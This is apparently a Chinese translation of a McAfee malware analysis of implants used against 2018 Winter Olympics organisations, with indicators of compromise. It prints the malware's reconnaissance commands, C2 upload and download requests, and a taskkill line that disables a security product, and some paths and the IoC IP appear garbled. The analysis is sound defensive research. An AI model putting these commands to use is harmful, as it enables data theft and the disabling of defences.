> 原文链接: https://www.anquanke.com//post/id/97602 


# Gold Dragon：针对冬奥会的恶意软件


                                阅读量   
                                **127284**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">1</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p0.ssl.qhimg.com/t01de3eb59f391a420a.jpg)](https://p0.ssl.qhimg.com/t01de3eb59f391a420a.jpg)

## 一、前言

McAfee ATR（Advanced Threat Research，高级威胁研究）团队最近发布了一份[报告](https://securingtomorrow.mcafee.com/mcafee-labs/malicious-document-targets-pyeongchang-olympics/)，介绍了针对平昌冬奥会相关组织的无文件攻击活动。攻击者使用了PowerShell植入体，连接到攻击者的服务器，收集基本的系统信息。当时我们并没有确认攻击者获得受害者系统的访问权限后具体执行了什么操作。

McAfee ATR现在又发现了攻击者使用的其他植入体（implant），这些植入体的功能是实现本地持久化，进一步窃取数据、拓展目标访问方式。根据代码中出现的特征，我们分别将2017年12月份出现的这些植入体命名为Gold Dragon（黄金龙）、Brave Prince（勇敢王子）、Ghost419以及Running Rat（奔跑硕鼠）。

2017年12月24日，我们的分析人员发现了使用韩语的植入体：Gold Dragon。2018年1月6日，ATR发现了针对奥运会的攻击活动，现在我们可以肯定，这个植入体是此次攻击活动中所使用的第二阶段载荷。在奥运会攻击活动中使用的PowerShell植入体是基于PowerShell Empire框架的一个stager攻击载荷，可以创建一个加密通道，连接至攻击者的服务器。然而，这款植入体需要其他模块的配合，才能形成完整的后门。此外，除了使用简单的计划任务外，PowerShell植入体并不具备其他本地持久化机制。与最初的PowerShell植入体相比，Gold Dragon具备更强大的本地持久化机制，使攻击者能够在目标系统上完成更多任务。在攻击者攻击冬奥会的同一天，我们观察到了Gold Dragon重新活跃的踪影。

Gold Dragon恶意软件的功能更加丰富，可以收集目标系统信息，并将结果发送给控制服务器。PowerShell植入体只具备基本的数据收集能力，如用户名、域名、主机名以及网络配置信息，这些信息可以用来识别攻击者感兴趣的目标，针对这些目标发动更为复杂的恶意软件攻击。



## 二、Gold Dragon

Gold Dragon是一款数据收集植入体，最早于12月24日出现在公众视野中。攻击者在样本中硬编码了一个域名：`www.golddragon.com`，这个域名在样本中多次出现，这也是我们将其命名为Gold Dragon的原因所在。

[![](https://p5.ssl.qhimg.com/t01367c18fdfe7d2c96.png)](https://p5.ssl.qhimg.com/t01367c18fdfe7d2c96.png)

在整个恶意软件感染及载荷攻击链条中，该样本充当的是二次侦察工具以及下载器角色，为后续的攻击载荷服务。除了从控制服务器下载以及执行程序之外，Gold Dragon还可以生成密钥，用来加密从系统中收集到的数据。前面那个域名并没有在控制过程中使用，加密数据会发往另一个服务器：`ink.inkboom.co.kr`，2017年5月份出现的植入体也曾用过这个域名。

我们从2017年5月份起就已经跟踪到Ghost419以及Brave Prince，与这些植入体相比，Gold Dragon也包含相同的元素、代码以及相似的行为。我们发现Gold Dragon变种（创建时间为12月24日）曾下载过一个DLL植入体（创建时间为12月21日）。这个变种的创建时间比钓鱼邮件攻击活动要早3天，作为钓鱼邮件的第二个文档发送给333个受害组织。12月24日的Gold Dragon变种使用的控制服务器为`nid-help-pchange.atwebpages.com`，而12月21日的Brave Prince变种也用到了这个域名。

2017年7月，Gold Dragon的第一个变种在韩国首次出现。最开始时Gold Dragon的文件名为`한글추출.exe`，直译过来就是Hangul Extraction（韩文提取），该样本只在韩国出现。在针对奥运会相关组织的攻击活动中，我们频繁看到5个Gold Dragon变种的身影（这些变种的创建时间为12月24日）。



## 三、分析Gold Dragon

在启动时，Gold Dragon会执行如下操作：

1、动态加载多个库中的多个API，构建导入函数；

2、为自身进程获取调试权限（”SeDebugPrivilege“），以便远程读取其他进程的内存数据。

恶意软件并没有为自身创建本地持久化机制，但会为系统上的另一个组件（如果该组件存在）设置本地持久化：

1、恶意软件首先会查找系统上是否正在运行Hangul word processor（HWP，HWP是类似于微软Word的一款韩国文档处理程序）。

[![](https://p3.ssl.qhimg.com/t0166520cea133f9a7c.png)](https://p3.ssl.qhimg.com/t0166520cea133f9a7c.png)

2、如果`HWP.exe`正在运行，恶意软件会解析传递给`HWP.exe`的命令行参数中的文件路径，获取HWP当前打开的文件。

3、将该文件（文件名通常为`*.hwp`）拷贝至临时目录中：`C:DOCUME~1&lt;username&gt;LOCALS~1Temp2.hwp`。

4、将hwp文件加载到`HWP.exe`中。

5、恶意软件读取`2.hwp`的内容，通过特征字符串“JOYBERTM”查找文件中的”MZ魔术标志“。

[![](https://p2.ssl.qhimg.com/t01211785a86e76aec7.png)](https://p2.ssl.qhimg.com/t01211785a86e76aec7.png)

6、出现这个标志则代表`.hwp`文件中存在经过加密的MZ标志，恶意软件可以解密这段数据，将其写入用户的启动目录中：`C:Documents and Settings&lt;username&gt;Start MenuProgramsStartupviso.exe`。

7、这样就能实现本地持久化，在主机重启后运行恶意软件。

8、成功将载荷写入启动目录后，恶意软件就会删除主机上的`2.hwp`。

恶意软件之所以这么做，原因可能有以下几点：

1、在主机上实现本地持久化；

2、为主机上的其他组件实现本地持久化。

3、当另一个独立的更新组件从控制服务器上下载更新后，可以在主机上更新为最新版恶意软件。

这款恶意软件的二次侦察功能及数据收集功能仍然有限，并不是完整版的间谍软件。攻击者从主机上收集的所有信息首先会存放在某个文件中（`C:DOCUME~1&lt;username&gt;APPLIC~1MICROS~1HNC1.hwp`），经过加密后发送给控制服务器。

恶意软件会从主机上手机如下信息，存放在`1.hwp`文件中，然后发送给控制服务器：

1、使用命令列出用户桌面上的目录：

`cmd.exe /c dir C:DOCUME~1&lt;username&gt;Desktop &gt;&gt; C:DOCUME~1&lt;username&gt;APPLIC~1MICROS~1HNC1.hwp`

2、使用命令列出用户最近访问的文件：

`cmd.exe /c dir C:DOCUME~1&lt;username&gt;Recent &gt;&gt; C:DOCUME~1&lt;username&gt;APPLIC~1MICROS~1HNC1.hwp`

3、使用命令列出系统`%programfiles%`文件夹中的目录：

`cmd.exe /c dir C:PROGRA~1 &gt;&gt; C:DOCUME~1&lt;username&gt;APPLIC~1MICROS~1HNC1.hwp`

4、使用命令收集主机的系统信息：

`cmd.exe /c systeminfo &gt;&gt; C:DOCUME~1&lt;username&gt;APPLIC~1MICROS~1HNC1.hwp`

5、将`ixe000.bin`文件从`C:Documents and Settings&lt;username&gt;Application DataMicrosoftWindowsUserProfilesixe000.bin`拷贝至`C:DOCUME~1&lt;username&gt;APPLIC~1MICROS~1HNC1.hwp`。

6、收集当前用户注册表中的`Run`键值信息。

```
HKEY_CURRENT_USERSOFTWAREMicrosoftWindowsCurrentVersionRun
Number of subkeys
(&lt;KeyIndex&gt;) &lt;KeyName&gt;
Number of Values under each key including the parent Run key
(&lt;ValueIndex&gt;) &lt;Value_Name&gt; &lt;Value_Content&gt;
```

[![](https://p0.ssl.qhimg.com/t01004732dcde311b73.png)](https://p0.ssl.qhimg.com/t01004732dcde311b73.png)

带有注册表信息以及系统信息的`1.hwp`如下所示：

[![](https://p5.ssl.qhimg.com/t01a1c5443a5f30d95a.png)](https://p5.ssl.qhimg.com/t01a1c5443a5f30d95a.png)

Gold Dragon会在信息窃取过程中执行如下步骤：

1、一旦恶意软件从主机上收集到了所需的数据，则会使用`www[dot]GoldDragon[dot]com`这个密码来加密`1.hwp`文件。

2、加密后的数据写入`1.hwp`文件中。

3、在信息窃取过程中，恶意软件会使用base64算法编码经过加密的数据，然后使用HTTP POST请求将结果发送给控制服务器，所使用的URL地址为：`http://ink[dot]inkboom.co.kr/host/img/jpg/post.php`。

4、在请求过程中使用的HTTP数据及参数包含如下内容：

```
Content-Type: multipart/form-data; boundary=—-WebKitFormBoundar ywhpFxMBe19cSjFnG &lt;followed by base64 encoded &amp; encrypted system info&gt;
User Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; .NET CLR 1.1.4322)
Accept-Language: en-us
HTTP Version: HTTP/1.0
```

此外，恶意软件也会下载并执行控制服务器为其提供的其他组件。控制服务器会根据恶意软件提供的主机名以及用户名返回其他组件，恶意软件将主机名及用户名嵌入HTTP GET请求中，如下所示：

```
GET http://ink[dot]inkboom.co.kr/host/img/jpg/download.php?filename=&lt;Computer_Name&gt;_&lt;username&gt;&amp;continue=dnsadmin
```

从控制服务器那成功获取组件后，恶意软件会将下一阶段拷贝至当前用户的Application Data目录，再加以执行：

```
C:DOCUME~1&lt;username&gt;APPLIC~1MICROS~1HNChupdate.ex
```

**备注：的确是`ex`文件，并非`exe`文件**

[![](https://p5.ssl.qhimg.com/t012046710253f0a0f4.png)](https://p5.ssl.qhimg.com/t012046710253f0a0f4.png)

恶意软件会检查与反恶意软件产品有关的进程来规避恶意行为：

1、检查是否存在带有”v3“以及”cleaner“关键字的任何进程。

[![](https://p1.ssl.qhimg.com/t01adf0aba5b5fc8c6f.png)](https://p1.ssl.qhimg.com/t01adf0aba5b5fc8c6f.png)

2、如果发现这类进程，则向这些进程的窗口线程发送WM_CLOSE消息，终止这些进程。

[![](https://p3.ssl.qhimg.com/t01d768cea2be56d644.png)](https://p3.ssl.qhimg.com/t01d768cea2be56d644.png)



## 四、分析Brave Prince

Brave Prince是一款韩语植入体，代码以及行为与Gold Dragon变种类似，特别是系统信息窃取过程以及控制服务器通信机制方面更加相似。该恶意软件会收集受害者配置信息、硬盘内容、注册表、计划任务、正在运行的进程等等详细信息。研究人员最早于2017年12月13日发现Brave Prince，当时这款恶意软件会通过韩国的Daum邮件服务将收集到的信息发送给攻击者。与Gold Dragon相同的是，后来的变种则会将信息通过HTTP POST方式发送给Web服务器。

[![](https://p3.ssl.qhimg.com/t01d87a001e7b8e2744.png)](https://p3.ssl.qhimg.com/t01d87a001e7b8e2744.png)

Brave Prince的Daum变种会将收集到的信息保存到`PI_00.dat`文件中。该文件会以附件形式发给攻击者的邮箱地址。后来的变种则会将文件通过HTTP POST命令上传至Web服务器。该植入体会从受害者系统中收集如下类型数据：

1、目录及文件；

2、网络配置信息；

3、地址解析协议的缓存信息；

4、通过系统配置收集任务信息。

Brave Prince的这两个变种都可以杀掉Daum工具所对应的某个进程（该进程可以阻止恶意代码，这是韩国独有的一款工具）

```
taskkill /f /im daumcleaner.exe
```

5、后来的Brave Prince变种中还会硬编码如下字符串：

```
c:utilsc2ae_uiproxy.exe
c:userssalesappdatalocaltempdwrrypm.dl
```



## 五、分析Ghost419

Ghost419是一款韩语植入体，最早于2017年12月18日出现，最近的变种则在针对奥运会的钓鱼邮件活动的前两天集中出现。这款恶意软件会向控制服务器发送硬编码的字符串及URL参数，我们可以根据这些特征来识别这款软件。Ghost419最早可以追溯到于2017年7月29日创建的某个样本，该样本似乎是一个非常早期的版本（没有硬编码这些特征）。7月份的变种与12月份的变种大约共享46%的代码。早期版本的植入体会创建一个特殊的互斥量（kjie23948_34238958_KJ238742），12月份的变种中也包含这个特征，但其中有一位数字不同。Ghost419基于Gold Dragon以及Brave Prince开发而成，包含一些共享元素及代码（特别是系统二次侦察函数方面更加相似）。

[![](https://p2.ssl.qhimg.com/t0129c440592f35ae0d.png)](https://p2.ssl.qhimg.com/t0129c440592f35ae0d.png)

上传过程中用到的`WebKitFormBoundarywhpFxMBe19cSjFnG`字符串同样也出现在2017年12月份的Gold Dragon变种中。

Gold Dragon样本如下：

[![](https://p4.ssl.qhimg.com/t01beb2fb7b68403ae3.png)](https://p4.ssl.qhimg.com/t01beb2fb7b68403ae3.png)

Ghost419样本如下：

[![](https://p0.ssl.qhimg.com/t01f3bb6837a01891c3.png)](https://p0.ssl.qhimg.com/t01f3bb6837a01891c3.png)

其他方法中还有许多类似之处，在通信机制方面，该样本使用的user agent字符串与Gold Dragon相同。

Gold Dragon的user agent字符串如下：

[![](https://p3.ssl.qhimg.com/t016c305ad107cf8359.png)](https://p3.ssl.qhimg.com/t016c305ad107cf8359.png)

Ghost419的user agent字符串如下：

[![](https://p0.ssl.qhimg.com/t01a0f6c96fc8c4a2f8.png)](https://p0.ssl.qhimg.com/t01a0f6c96fc8c4a2f8.png)



## 六、分析RunningRat

RunningRat是一款远程访问木马（RAT），需要两个DLL搭配使用。我们根据恶意软件中硬编码的字符串将其取名为RunningRat。在释放到目标系统中时，第一个DLL会被执行。该DLL包含3个主要功能：结束反恶意软件进程、解封装并执行主RAT DLL以及建立本地持久化机制。恶意软件会释放出Windows批处理文件`dx.bat`，该批处理文件会尝试结束`daumcleaner.exe`进程（一款韩国安全程序），然后再尝试执行自删除操作。

[![](https://p4.ssl.qhimg.com/t014734326cd1defea6.jpg)](https://p4.ssl.qhimg.com/t014734326cd1defea6.jpg)

第一个DLL会使用zlib压缩算法从自身文件中提取出一个资源文件。恶意软件作者在程序中保留了调试字符串，因此我们很容易就能识别出其中用到的算法。第二个DLL会在内存中解压缩，永远不会触及用户的文件系统，该文件也是主RAT执行的文件。最后，第一个DLL会在`SoftWareMicrosoftWindowsCurrentVersionRun`这个注册表路径中添加`SysRat`键值，确保系统启动时会运行恶意软件。

[![](https://p4.ssl.qhimg.com/t016b42b78fb28b95ad.jpg)](https://p4.ssl.qhimg.com/t016b42b78fb28b95ad.jpg)

[![](https://p4.ssl.qhimg.com/t01de35d89c86c5cfb9.jpg)](https://p4.ssl.qhimg.com/t01de35d89c86c5cfb9.jpg)

当第二个DLL载入内存后，第一个DLL会覆盖其中控制服务器对应的IP地址，这样就能有效地修改恶意软件需要连接的服务器地址。第二个DLL中硬编码的地址为`200.200.200.13`，被第一个DLL修改后会变为`223.194.70.136`。

[![](https://p2.ssl.qhimg.com/t017626e9020ac73ed5.jpg)](https://p2.ssl.qhimg.com/t017626e9020ac73ed5.jpg)

这种行为可能代表攻击者会复用这段代码，或者这段代码可能为某个恶意软件攻击包中的一部分。

第一个DLL用到了常见的一种反调试技术（检查SeDebugPrivilege）：

[![](https://p5.ssl.qhimg.com/t01d1705801f349a40f.jpg)](https://p5.ssl.qhimg.com/t01d1705801f349a40f.jpg)

第二个DLL一旦执行，则会收集受害者系统的配置信息，如操作系统版本、驱动器以及进程信息。

[![](https://p2.ssl.qhimg.com/t014f45c0467878516e.jpg)](https://p2.ssl.qhimg.com/t014f45c0467878516e.jpg)

[![](https://p2.ssl.qhimg.com/t019195558e51a8cec8.jpg)](https://p2.ssl.qhimg.com/t019195558e51a8cec8.jpg)

随后，恶意软件开始记录下用户的键盘敲击行为，使用标准的Windows网络API将这些信息发送给控制服务器，这也是该恶意软件的主要功能。

[![](https://p1.ssl.qhimg.com/t011473a1dfd8a2acc6.jpg)](https://p1.ssl.qhimg.com/t011473a1dfd8a2acc6.jpg)

根据我们的分析结果，窃取用户击键数据是RunningRat的主要功能，然而该DLL中也包含其他功能代码。这些代码包括拷贝剪贴板、删除文件、压缩文件、清除事件日志、关闭主机等等。然而，就目前而言，我们并没有发现满足执行这些代码的条件。

[![](https://p4.ssl.qhimg.com/t0160d70ea4525e3bcb.jpg)](https://p4.ssl.qhimg.com/t0160d70ea4525e3bcb.jpg)

McAfee ATR分析人员会继续研究RunningRat，以确认攻击者是否使用了这些代码，或者这些代码只是大型RAT工具包中的遗留代码而已。

第二个DLL使用了一些反调试技术，其中包括自定义的异常处理程序以及会产生异常的代码路径。

[![](https://p4.ssl.qhimg.com/t011f7ee1c052d63cae.jpg)](https://p4.ssl.qhimg.com/t011f7ee1c052d63cae.jpg)

[![](https://p4.ssl.qhimg.com/t01fa948374d3b6f1ec.png)](https://p4.ssl.qhimg.com/t01fa948374d3b6f1ec.png)

此外，代码中还包含一些随机的空白嵌套线程，以此延缓研究人员的静态分析进度。

[![](https://p0.ssl.qhimg.com/t01b2196a027a98c490.png)](https://p0.ssl.qhimg.com/t01b2196a027a98c490.png)

最后一种反调试技术与`GetTickCount`性能计数器有关，攻击者将该函数放在主要代码区域中，以检查恶意软件运行时，是否存在调试器导致延迟出现。

[![](https://p2.ssl.qhimg.com/t0198db7746d08dd8a1.jpg)](https://p2.ssl.qhimg.com/t0198db7746d08dd8a1.jpg)



## 七、总结

在McAfee ATR团队发现的钓鱼邮件攻击活动中，攻击者会使用图像隐写技术来传播PowerShell脚本（即第一阶段植入体）。如果大家想进一步了解隐写术，可以参考McAfee实验室发表的[威胁报告](https://www.mcafee.com/us/resources/reports/rp-quarterly-threats-jun-2017.pdf)（第33页）。

一旦PowerShell植入体被成功执行，本文介绍的植入体会在受害者系统上建立本地持久化机制。一旦攻击者通过无文件恶意软件突破目标系统，则会将这些植入体作为第二阶段攻击载荷加以传播。这些植入体中，部分植入体会判断系统中是否运行Hangul Word（韩国专用的文档处理软件），只有该软件正在运行时才会建立本地持久化机制。

发现这些植入体后，现在我们对攻击者的活动范围也掌握得更加全面。Gold Dragon、Brave Prince、Ghost419以及RunningRat的出现表明攻击者的攻击活动比我们原先了解的更加猖獗。通过持续性的数据窃取，攻击者可以在奥运会期间获得潜在的优势。

感谢Charles Crawford以及Asheer Malhotra在恶意软件分析过程中提供的帮助。



## 八、IoC

**IP**

```
194.70.136
```

**域名**

```
000webhostapp.com
000webhostapp.com
000webhostapp.com
nid-help-pchange.atwebpages.com
inkboom.co.kr
byethost7.com
```

**哈希值**

```
fef671c13039df24e1606d5fdc65c92fbc1578d9
06948ab527ae415f32ed4b0f0d70be4a86b364a5
96a2fda8f26018724c86b275fe9396e24b26ec9e
ad08a60dc511d9b69e584c1310dbd6039acffa0d
c2f01355880cd9dfeef75cff189f4a8af421e0d3
615447f458463dc77f7ae3b0a4ad20ca2303027a
bf21667e4b48b8857020ba455531c9c4f2560740
bc6cb78e20cb20285149d55563f6fdcf4aaafa58
465d48ae849bbd6505263f3323e818ccb501ba88
a9eb9a1734bb84bbc60df38d4a1e02a870962857
539acd9145befd7e670fe826c248766f46f0d041
d63c7d7305a8b2184fff3b0941e596f09287aa66
35e5310b6183469f4995b7cd4f795da8459087a4
11a38a9d23193d9582d02ab0eae767c3933066ec
e68f43ecb03330ff0420047b61933583b4144585
83706ddaa5ea5ee2cfff54b7c809458a39163a7a
3a0c617d17e7f819775e48f7edefe9af84a1446b
761b0690cd86fb472738b6dc32661ace5cf18893
7e74f034d8aa4570bd1b7dcfcdfaa52c9a139361
5e1326dd7122e2e2aed04ca4de180d16686853a7
6e13875449beb00884e07a38d0dd2a73afe38283
4f58e6a7a04be2b2ecbcdcbae6f281778fdbd9f9
389db34c3a37fd288e92463302629aa48be06e35
71f337dc65459027f4ab26198270368f68d7ae77
5a7fdfa88addb88680c2f0d5f7095220b4bbffc1
```
